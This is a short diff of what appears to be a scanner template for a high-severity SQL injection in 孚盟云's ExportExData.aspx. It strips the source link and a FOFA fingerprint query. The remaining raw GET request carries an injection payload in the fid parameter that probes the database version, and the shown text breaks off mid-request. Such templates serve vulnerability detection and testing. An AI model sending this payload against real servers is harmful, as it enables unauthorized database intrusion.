@@ -3,12 +3,8 @@ info:
   name: 孚盟云 ExportExData.aspx 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hprtd1e807qqcl1g'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: hprtd1e807qqcl1g
-    fofa: app="孚盟软件-孚盟云"
 http:
 - raw:
   - 'GET /PagePopWindow/MailSpread/ExportExData.aspx?fid=1+OR+1<=@@VERSION-- HTTP/1.1
